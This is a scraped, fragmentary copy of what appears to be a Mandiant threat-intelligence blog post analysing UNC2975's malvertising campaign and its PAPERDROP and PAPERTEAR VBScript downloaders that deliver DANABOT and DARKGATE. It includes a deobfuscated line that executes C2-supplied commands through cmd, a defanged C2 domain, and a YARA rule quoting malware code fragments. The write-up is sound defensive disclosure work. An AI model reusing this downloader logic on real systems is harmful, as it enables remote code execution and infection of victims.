href="https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/statements/rem-statement" rel="noopener" target="_blank"><u>designate code comments</u></a>. This can be seen in Figure 10. </p>
<p>Looking through the smoke-screened code reveals some interesting elements. PAPERDROP seemingly leverages basic mathematical operations (especially modulus or “Mod”) as part of its execution flow.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 10: PAPERDROP type #1 source code, math functions</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>It also does little in the way of obfuscation with regard to concealing its C2 addresses or file system path names. It merely separates these values through individual function calls to add characters to progressively concatenated strings, but it is possible to view the characters by simply scrolling through the file and reading them in reverse order from bottom to top (see Figure 11).</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" PAPERDROP build type #1 feature elaborate Sleep calls, presumably in an attempt to evade sandbox detection.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section type #2 is much closer to PAPERTEAR in its architecture. It makes limited use of smoke-screened/obfuscated code in comparison to build type #1, though it still makes use of mathematical functions as part of its execution flow.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig14.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig14.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig14.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 13: PAPERDROP type #2 raw source code</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>When fully deobfuscated, the core download functionality executes as shown in Figure 14.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig15.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig15.max-700x700.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig15.max-700x700.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig15.max-700x700.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 14: PAPERDROP Type #2 deobfuscated source code, core payload retrieval</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>In the case of Figure 14, the file payload from <code>ignitethefund[.]com</code> was saved to <code>C:\ProgramData\1DR.png</code>, though it was executed by the PAPERDROP VBS as a DLL.</p>
<h3>PAPERTEAR</h3>
<p>Similar to PAPERDROP build type #2, PAPERTEAR is also comparatively less dense. It too avoids excessive use of junk code and stays fairly direct in terms of its execution flow. When executed on a host, most variants of PAPERTEAR try to collect a list of running processes via Windows Management Instrumentation [<a href="https://attack.mitre.org/techniques/T1047/" rel="noopener" target="_blank"><u>T1047</u></a>].</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 15: PAPERTEAR source code, process retrieval</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>PAPERTEAR will then initiate an attempt to retrieve its payload via an HTTP POST request to a remote C2 server via a <a href="https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttprequest" rel="noopener" target="_blank"><u>WinHTTPrequest</u></a> object, and, for certain variants, appends the list of running processes it retrieves (code shown in Figure 16) to the outbound HTTP request header. One of the minor obfuscation methods leveraged by PAPERTEAR samples is the sporadic inclusion of curious code comments (Figure 16), presumably to avoid static-based detections and amplify code entropy. In this case, however, identifying the literary source of the comments was…quite elementary.</p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig17.max-1100x1100.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>Figure 16: PAPERTEAR source code, HTTP functionality, code comments sourced from a Sherlock Holmes novel</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>From there, PAPERTEAR will then parse the HTTP response from the C2 server and directly execute its contents on the host via <a href="https://learn.microsoft.com/en-us/windows/win32/shell/launch" rel="noopener" target="_blank"><u>ShellExecute</u></a>. With the limited obfuscation removed, the crucial snippet of code from Figure 16 that performs this function would otherwise appear as:</p>
<p> </p>
<pre><code>CreateObect(&quot;Shell Application&quot;).ShellExecute &quot;cmd&quot;,&quot;&lt;variable with http response from c2 containing arbitrary command&gt;&quot;,&quot;&quot;,&quot;&quot;,0
</code></pre>
<p>This is the core differentiator between PAPERTEAR and PAPERDROP. While PAPERTEAR executes commands directly from the HTTP response it receives, PAPERDROP writes the contents of the HTTP response to disk prior to executing additional steps in its infection chain. PAPERTEAR is primarily associated with the distribution of DARKGATE payloads and is suspected to be integrated directly into the DARKGATE malware build process.</p>
<h2>Campaign Tracking </h2>
<p>Mandiant has been disseminating intelligence on UNC2975’s campaign within <a href="https://cloud.google.com/security/products/threat-intelligence" rel="noopener" target="_blank"><u>Mandiant Advantage</u></a>, providing our customers with notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, and the use of new infrastructure UNC2975 has used to carry out its mission. </p>
<p>Mandiant tracks separate campaigns for each distribution method or actors delivering the Malware-as-a-Service backdoor DARKGATE. To differentiate between the initial malware distribution, DARKGATE infrastructure, and follow-on activity, Mandiant tracks each part of the intrusion as separate clusters until further overlaps are identified and warrant merging. Mandiant tracks the DARKGATE Malware-as-a-Service infrastructure and associated payloads as UNC5085 while separately clustering the different distribution methods and any follow-on actors.</p>
<p>See our previous blog post for more insights into how Mandiant can help <a href="https://www.mandiant.com/resources/blog/attacker-visibility-threat-campaigns" rel="noopener" target="_blank"><u>Gain Visibility Into Attacker Activity with Threat Campaigns</u></a>. The following campaigns within Mandiant Advantage are associated with recent DARKGATE distribution actors and follow-on activity: </p>

<h2>Outlook and Implications</h2>
<p>In M-Trends 2023, the three most common initial access techniques Mandiant observed related to workstation compromise were phishing [<a href="https://attack.mitre.org/techniques/T1566/" rel="noopener" target="_blank"><u>T1566</u></a>], drive-by compromise [<a href="https://attack.mitre.org/techniques/T1189/" rel="noopener" target="_blank"><u>T1189</u></a>], and replication through removable media [<a href="https://attack.mitre.org/techniques/T1091/" rel="noopener" target="_blank"><u>T1091</u></a>]. Within the category of drive-by compromise, Mandiant has observed an increase from 2022 to 2023 in the number of investigations involving malicious advertisements where the initial infection vector was able to be identified. More broadly, in 2022 alone, Google removed over <a href="https://blog.google/products/ads-commerce/our-2022-ads-safety-report/" rel="noopener" target="_blank"><u>5.2 billion ads, restricted over 4.3 billion ads and suspended over 6.7 million</u></a> advertiser accounts. While it is unlikely that malvertising will cease to be a viable attack vector for threat actors, maintaining a level of response readiness when such threats are identified is key to being able to neutralize campaigns in their early stages. In this case, Mandiant Managed Defense, in partnership with Mandiant Intelligence and the Google Ads team, was successfully able to protect users on a granular host-based level as well as at a global scale across the Google ecosystem.</p>
<p>Mandiant’s Managed Defense threat hunting team focuses on identifying behaviors associated with threat actors and endpoint compromises, especially those that don’t typically generate product-based alerts. By focusing on behavioral indicators, we can identify evidence of different types of compromise, such as <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-southeast-asia" rel="noopener" target="_blank"><u>malware execution</u></a> or a threat actor profiling an environment using <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc961-multiverse-financially-motivated" rel="noopener" target="_blank"><u>discovery commands</u></a>. Like all security analysts, when we identify evidence of compromise, we analyze the data to try to answer the question: “How was the system initially compromised?” Performing a deeper dive to identify the initial infection vector and related timeline events provides two benefits: [1] the ability to identify campaigns through repeated use of infrastructure and indicators and [2] additional malware or behavioral artifacts that can be used to create or expand existing detections, event correlations, and threat hunting missions. The Detection Opportunities section of this blog post includes commands and artifacts that Mandiant discovered beyond the initial detection events that were used to create additional signatures to identify future activity faster.</p>

<h2>Appendix C: YARA Rules</h2>
<pre><code>rule M_Downloader_PAPERDROP_1
{
     meta:
        author = &quot;Mandiant&quot;
        disclaimer = &quot;This rule is for hunting purposes only and 
has not been tested to run in a production environment.&quot;

    strings:

        $v1_1 = &quot;missing from UIHFad computer&quot;
        $v1_2 = &quot;Dim UIHFad:set UIHFad = CreateObject(\&quot;ADODB.Stream\&quot;)&quot;
        $v2_1 = &quot;a = \&quot;QJWRWIIPQLYYREESOR&quot;
        $v2_2 = &quot;temp = temp + ChrW(Dict.Item(Mid(a,y-1,2)))&quot;
        $v3_1 = &quot;ChrW(Dict.Item(Mid(&quot;
        $v3_2 = &quot;-1,2)))&quot;
        $v3_3 = &quot; Mod 2 = 0 and Dict.count &lt;&gt; 256  then&quot;
        $v4_1 = &quot; = CreateObject(&quot;
        $v4_2 = &quot; Mod 2 = 0 and &quot;
        $v4_3 = &quot;Execute(&quot;
        $v4_4 = /if \w+ Mod 2 = 0 and \w+.count &lt;&gt; \w+ 
then[\x0a\x0d]{1,2}\w+.Add Mid\(\w+,\w+-1,2\),/
 
    condition:
        uint16(0)!=0x5A4D and ( all of ($v1*) or all of ($v2*) 
or all of ($v3*) or all of ($v4*))
}</code></pre>

dir\u003d\"ltr\"\u003eEarlier this year, Mandiant’s Managed Defense threat hunting team identified an UNC2975 malicious advertising (“malvertising”) campaign presented to users in sponsored search engine results and social media posts, consistent with activity reported in \u003ca href\u003d\"https://www.esentire.com/blog/from-darkgate-to-danabot\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eFrom DarkGate to DanaBot\u003c/a\u003e. This campaign dates back to at least June 19, 2023, and has abused search engine traffic and leveraged malicious advertisements to affect multiple organizations, which resulted in the delivery of the DANABOT and DARKGATE backdoors.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eManaged Defense worked with Advanced Practices and with the Google Anti-Malvertising team to remove the malicious advertisements from the ads ecosystem, and subsequently alerted other impacted organizations to also take actions against this campaign.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eThis blog post covers the details of recently discovered infrastructure operated by the distribution threat cluster UNC2975, which Mandiant has tracked since 2021, that leveraged malicious advertisements to trick users into visiting fake “unclaimed funds'' themed websites. In this UNC2975 campaign, the malicious websites delivered PAPERDROP and PAPERTEAR downloader malware that eventually led to DANABOT and DARKGATE backdoor malware. This blog post also highlights how Mandiant's findings result in takedowns of malicious ad campaigns served on Google infrastructure.\u003c/p\u003e\n\u003ch2 dir\u003d\"ltr\"\u003eUNC2975 Targeting and TTPs\u003c/h2\u003e\n\u003cp dir\u003d\"ltr\"\u003eMandiant currently tracks around 30 threat clusters that use malicious advertisements for the delivery of malware, including backdoors, data stealers, and downloaders. Since at least 2021, a threat actor tracked as UNC2975 has leveraged this technique to distribute downloader malware for second-stage payloads on victim endpoints.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eUNC2975 is a distribution threat cluster that has historically used malvertising in order to distribute the VBScript-based downloader tracked as PAPERDROP. The distribution of PAPERDROP from UNC2975’s fake websites has primarily led to the deployment of the Delphi-based backdoor DANABOT. DANABOT is part of a Malware-as-a-Service platform where multiple affiliates can purchase access to the service. Beginning in September 2023, UNC2975’s malware distribution shifted. Instead of DANABOT, UNC2975 deployed a Delphi-based backdoor tracked as part of the DARKGATE Malware-as-a-Service platform. Due to multiple affiliates using these service platforms, the distribution methods of DANABOT and DARKGATE may vary across different distribution actors.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eUNC2975 creates fake websites that leverage themes such as unclaimed money, family ancestry, and astrology/horoscopes to facilitate its distribution operations. The threat cluster has commonly used social media advertisements to promote the fake websites but have since expanded to leverage additional platforms such as Microsoft and Google advertising.\u003c/p\u003e\n\u003ch2 dir\u003d\"ltr\"\u003eAds Backwards: A Google Malvertising Response Team Investigation\u003c/h2\u003e\n\u003cp dir\u003d\"ltr\"\u003eUpon being notified of this campaign by Mandiant Managed Defense, the Google Anti-Malvertising team took enforcement actions and pivoted on the advertisement metadata to find additional related entries and to improve abuse detection and classification systems.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eAdversaries use several sophisticated techniques including impersonating genuine businesses, cloaking (i.e., hiding malicious web pages that only get revealed under specific conditions), and redirection to circumvent Google Ads verification and defense mechanisms.\u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eTo protect users, Google detects, prevents, and blocks abusive activity as detailed in our annual \u003ca href\u003d\"https://blog.google/products/ads-commerce/our-2022-ads-safety-report/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eAds Safety report\u003c/u\u003e\u003c/a\u003e. Google encourages users to report suspicious advertisements they come across through either \u003ca href\u003d\"https://support.google.com/My-Ad-Center-Help/answer/13861201?hl\u003den-GB\u0026amp;sjid\u003d5587482143761892718-NA\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eMy Ad Center reporting functionality\u003c/u\u003e\u003c/a\u003e or using \u003ca href\u003d\"https://support.google.com/ads/contact/vio_other_aw_policy\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003ethis form\u003c/u\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 dir\u003d\"ltr\"\u003eMalware Observed\u003c/h2\u003e\n\u003cp dir\u003d\"ltr\"\u003eMandiant observed the following malware families while investigating this campaign.\u003c/p\u003e\n\u003cdiv dir\u003d\"ltr\"\u003e\u003cbr\u003e\n\u003cdiv #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003ePAPERDROP\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003ePAPERDROP is a downloader written in Visual Basic Script that communicates via HTTPS. It has been observed downloading DANABOT by writing it to disk and then executing it.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003ePAPERTEAR\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003ePAPERTEAR is a downloader written in Visual Basic Script that communicates via HTTP. PAPERTEAR appends a list of enumerated local processes in the initial HTTP request.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003eDANABOT\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003eDANABOT is a backdoor written in Delphi that communicates using a custom binary protocol over TCP. The backdoor implements a plug-in framework that allows it to add capabilities via downloaded plugins. DANABOT's capabilities include full system control using a VNC or RDP plugin, video and screenshot capture, keylogging, arbitrary shell command execution, and file transfer. DANABOT's proxy plugin allows it to redirect or manipulate network traffic associated with targeted websites. This capability is often used to capture credentials or payment data. DANABOT can also extract stored credentials associated with web browsers and FTP clients.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eNumerous observed campaigns leveraging DANABOT have been reported, including UNC3379 activity associated with a \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/supply-chain-node-js\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003ecoinminer campaign\u003c/a\u003e, and a similar mechanism for DANABOT distribution using a \u003ca href\u003d\"https://www.bleepingcomputer.com/news/security/popular-coa-npm-library-hijacked-to-steal-user-passwords/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003edifferent JS library\u003c/a\u003e.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003eDARKGATE\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\n\u003cp dir\u003d\"ltr\"\u003eDARKGATE is a Delphi-based backdoor capable of performing keyboard capture, shell command execution, file transfer and execution, and credential theft. Other functions include system survey, shutdown and restart, taking screengrabs and controlling a cryptominer. Some variants retrieve their command-and-control (C2 or C\u0026amp;C) address from a page on the pastebin.com website.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cp dir\u003d\"ltr\"\u003eMore notable instances of OSINT reporting involving DARKGATE include \u003ca href\u003d\"https://techcrunch.com/2023/10/05/qakbot-hackers-are-still-spamming-victims-despite-fbi-takedown/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eactors previously associated with QAKBOT leveraging DARKGATE as a payload\u003c/a\u003e, and some insights into \u003ca href\u003d\"https://github.security.telekom.com/2023/08/darkgate-loader.html\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eDARKGATE’s technical architecture and use\u003c/a\u003e.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 1: Malware families observed\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003ch2 dir\u003d\"ltr\"\u003eA Pain in the Ads: UNC2975 Campaign Discovery\u003c/h2\u003e\n\u003cp\u003eThreat actors purchase advertisements [MITRE ATT\u0026amp;CK® Technique \u003ca href\u003d\"https://attack.mitre.org/techniques/T1583/008/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1583.008\u003c/u\u003e\u003c/a\u003e] for malicious websites with the goal of tricking users into visiting and downloading malware [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1189/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1189\u003c/u\u003e\u003c/a\u003e], which can lead to data theft and \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/magniber-ransomware-infects-only-the-right-people\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eransomware\u003c/u\u003e\u003c/a\u003e. Platforms that serve advertisements, such as search engines or social media, can provide granular controls that allow advertisers to target specific audiences based on users’ geographic locations, IP address range (e.g., geofencing), browsing history, and \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/how-rise-cryptocurrencies-shaping-cyber-crime-landscape-growth-miners\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003edevice types\u003c/u\u003e\u003c/a\u003e. Some of the more robust advertising platforms (such as \u003ca href\u003d\"https://about.ads.microsoft.com/en-us/insights/planning-tools/microsoft-audience-network-data\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eBing\u003c/u\u003e\u003c/a\u003e and Google \u003ca href\u003d\"https://support.google.com/google-ads/answer/2580383\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eAds\u003c/u\u003e\u003c/a\u003e) provide even more targeting categories, like age, gender, income level, and other audience attributes. These capabilities allow advertisers, both legitimate and malicious, to craft ads specific to their desired targets and improve the effectiveness of their campaigns. This also allows malicious advertisers who are able to avoid policy enforcement to develop and retain “customer” profiles about the victims who interact with their ads for use in future targeting operations.\u003c/p\u003e\n\u003cp\u003eEarlier this year, Managed Defense’s threat hunting team identified UNC2975 advertisements presented to users in sponsored search engine results and social media posts. The advertised websites were displayed in the sponsored results for searches related to “unclaimed money” where individuals can search for and claim funds that are held by federal or state government agencies [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1583/008/\" rel\u003d\"noopener\" The DANABOT payload also modified the local proxy settings in the Windows registry [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1562/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1562\u003c/u\u003e\u003c/a\u003e].\u003c/p\u003e\n\u003cp\u003eFinally, the DANABOT-infected \u003ccode\u003erundll32.exe\u003c/code\u003e process wrote to a randomly named \u003ccode\u003e.tmp\u003c/code\u003e file \u003ccode\u003eC:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Local\\Temp\\Prfpdh.tmp\u003c/code\u003e.\u003c/p\u003e\n\u003ch2\u003eWiseAds Comments: PAPERDROP and PAPERTEAR\u003c/h2\u003e\n\u003cp\u003eThroughout the course of the observed malvertising campaign, Mandiant encountered both PAPERDROP and PAPERTEAR Visual Basic Script (VBS) files in use by malicious actors to facilitate payload deployment.\u003c/p\u003e\n\u003cp\u003eThe main difference in functionality between PAPERDROP and PAPERTEAR is that PAPERDROP makes heavier use of local files to facilitate payload deployment, whereas PAPERTEAR leverages direct command line execution.\u003c/p\u003e\n\u003ch3\u003ePAPERDROP\u003c/h3\u003e\n\u003cp\u003eInitially observed by Mandiant in January 2021 in use by UNC2975, PAPERDROP is primarily associated with DANABOT payload distribution and generally has several distinct characteristics across two different build types. NOTE: Since 2021, PAPERDROP has been observed in use by multiple UNC groups. The samples shown in this section represent a cross-section of the PAPERDROP malware family as a whole, and are not specific to UNC2975 activity.\u003c/p\u003e\n\u003cp\u003eThe first build type is markedly denser than the second. It features prominent use of code comments, complex variable names, and other junk code presumably used as a rudimentary code obfuscation mechanism [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1027/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1027\u003c/u\u003e\u003c/a\u003e].\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 9: PAPERDROP type #1, junk code and comments\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png 208w, https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png 208w"," 208px,  208px","https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig10.max-300x300.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eIn addition to the more commonly observed mechanism for code comments leveraging single quotes \u003ccode\u003e‘\u003c/code\u003e, Visual Basic also allows the use of the characters “REM” to \u003ca href\u003d\"https://learn.microsoft.com/en-us/dotnet/visual-basic/language-reference/statements/rem-statement\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003edesignate code comments\u003c/u\u003e\u003c/a\u003e. This can be seen in Figure 10. \u003c/p\u003e\n\u003cp\u003eLooking through the smoke-screened code reveals some interesting elements. It too avoids excessive use of junk code and stays fairly direct in terms of its execution flow. When executed on a host, most variants of PAPERTEAR try to collect a list of running processes via Windows Management Instrumentation [\u003ca href\u003d\"https://attack.mitre.org/techniques/T1047/\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eT1047\u003c/u\u003e\u003c/a\u003e].\u003c/p\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 15: PAPERTEAR source code, process retrieval\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png",null,null,"https://storage.googleapis.com/gweb-cloudblog-publish/images/whoop-ads-fig16.max-1100x1100.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003ePAPERTEAR will then initiate an attempt to retrieve its payload via an HTTP POST request to a remote C2 server via a \u003ca href\u003d\"https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttprequest\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003cu\u003eWinHTTPrequest\u003c/u\u003e\u003c/a\u003e object, and, for certain variants, appends the list of running processes it retrieves (code shown in Figure 16) to the outbound HTTP request header. One of the minor obfuscation methods leveraged by PAPERTEAR samples is the sporadic inclusion of curious code comments (Figure 16), presumably to avoid static-based detections and amplify code entropy. In this case, however, identifying the literary source of the comments was…quite 